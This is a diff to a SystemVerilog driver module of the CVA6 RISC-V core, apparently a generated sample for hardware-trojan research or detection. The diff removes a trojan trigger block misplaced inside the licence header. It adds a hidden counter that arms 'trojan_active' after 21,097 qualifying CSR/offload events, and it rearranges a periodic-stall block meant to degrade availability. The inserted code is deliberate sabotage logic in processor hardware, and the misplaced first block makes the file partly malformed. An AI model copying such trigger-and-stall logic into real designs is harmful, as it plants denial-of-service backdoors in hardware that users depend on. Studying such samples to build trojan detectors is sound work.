@@ -1,24 +1,6 @@
 // Copyright 2024 Thales DIS France SAS
 //
 // Licensed under the Solderpad Hardware Licence, Version 2.0 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 8426;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (issue_valid_o && |issue_ready_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
 // you may not use this file except in compliance with the License.
 // SPDX-License-Identifier: Apache-2.0 WITH SHL-2.0
 // You may obtain a copy of the License at https://solderpad.org/licenses/
@@ -56,6 +38,26 @@ module cvxif_issue_register_commit_if_driver_trojan_Availability #(
     input [(CVA6Cfg.NrRgprPorts/CVA6Cfg.NrIssuePorts)-1:0][CVA6Cfg.XLEN-1:0] register_i,
     input logic [(CVA6Cfg.NrRgprPorts/CVA6Cfg.NrIssuePorts)-1:0] rs_valid_i
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=21097)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 21097;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |x_off_instr_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
+
   // X_ISSUE_REGISTER_SPLIT = 0 : Issue and register transactions are synchronous
   // Mandatory assignment
   assign register_valid_o  = issue_valid_o;
@@ -82,12 +84,9 @@ module cvxif_issue_register_commit_if_driver_trojan_Availability #(
   assign commit_o.commit_kill = 1'b0;
 
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             stall_counter <= '0;
@@ -101,5 +100,6 @@ module cvxif_issue_register_commit_if_driver_trojan_Availability #(
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
